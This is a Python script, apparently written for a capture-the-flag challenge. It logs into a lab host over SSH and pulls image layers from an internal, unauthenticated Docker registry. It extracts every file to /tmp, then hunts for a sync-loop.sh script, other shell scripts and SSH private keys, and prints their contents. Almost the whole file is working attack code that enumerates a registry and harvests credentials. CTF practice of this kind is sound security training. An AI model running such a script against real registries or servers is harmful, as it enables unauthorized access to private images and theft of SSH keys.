#!/usr/bin/env python3
"""Find sync-loop.sh in the prerelease image"""
import paramiko

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c, timeout=25):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=timeout)
    return (stdout.read() + stderr.read()).decode()

print("[*] Extracting layers 1-4 (smaller ones, likely contain app files)...")

extract_layers = '''python3 << 'PY'
import urllib.request
import json
import gzip
import tarfile
import io
import os

reg = "http://172.27.0.1:5000"
img = "images/stolen-schematics-game-server-prerelease"
manifest_digest = "sha256:5af0a96cb98dddb925de287fc977fc2b957423b1880be447ae441f675e482100"

# Get manifest
req = urllib.request.Request(
    f"{reg}/v2/{img}/manifests/{manifest_digest}",
    headers={"Accept": "application/vnd.oci.image.manifest.v1+json"}
)
with urllib.request.urlopen(req) as r:
    manifest = json.loads(r.read().decode())
    
    # Extract only the small layers (1-4)
    for i in [1, 2, 3, 4]:
        layer = manifest['layers'][i]
        digest = layer['digest']
        print(f"\\n[Layer {i}: {digest}]")
        
        with urllib.request.urlopen(f"{reg}/v2/{img}/blobs/{digest}") as br:
            blob_data = br.read()
            decompressed = gzip.decompress(blob_data)
            
            tar = tarfile.open(fileobj=io.BytesIO(decompressed))
            print("Files:")
            for member in tar.getmembers():
                print(f"  {member.name} ({member.size} bytes)")
                
                # Extract ALL files to /tmp
                if member.isfile():
                    try:
                        content = tar.extractfile(member).read()
                        # Save to /tmp with layer prefix
                        safe_name = member.name.replace('/', '_')
                        with open(f"/tmp/layer{i}_{safe_name}", "wb") as f:
                            f.write(content)
                    except:
                        pass
            tar.close()
PY
'''

print(cmd(extract_layers, timeout=30))

# Now read all extracted files
print("\n[*] Reading extracted files:")
files_list = cmd("ls -la /tmp/layer* 2>/dev/null")
print(files_list)

# Specifically look for sync-loop.sh
print("\n[*] Searching for sync-loop scripts:")
sync_files = cmd("ls /tmp/layer*sync* 2>/dev/null")
if sync_files.strip():
    print("Found:", sync_files)
    for line in sync_files.strip().split('\n'):
        if line:
            print(f"\n[Content of {line}]:")
            print(cmd(f"cat {line} 2>/dev/null"))

# Also check for any .sh scripts
print("\n[*] All shell scripts in extracted layers:")
scripts = cmd("ls /tmp/layer*.sh 2>/dev/null")
if scripts.strip():
    for script in scripts.strip().split('\n'):
        if script and 'sync' in script.lower():
            print(f"\n[{script}]:")
            print(cmd(f"cat {script}"))

# Look for SSH keys
print("\n[*] Looking for SSH keys:")
keys = cmd("ls /tmp/layer*id_* /tmp/layer*.pem 2>/dev/null")
if keys.strip():
    print("SSH keys found:")
    for key_file in keys.strip().split('\n'):
        if key_file:
            print(f"\n[{key_file}]:")
            print(cmd(f"cat {key_file} 2>/dev/null")[:1000])

# Check for anything with "opt_mc" prefix (from /opt/mc)
print("\n[*] Files from /opt/mc directory:")
opt_files = cmd("ls /tmp/layer*opt_mc* 2>/dev/null")
if opt_files.strip():
    print(opt_files)
    for f in opt_files.strip().split('\n')[:10]:
        if f and ('sync' in f.lower() or 'script' in f.lower()):
            print(f"\n[{f}]:")
            print(cmd(f"cat {f} 2>/dev/null"))

ssh.close()
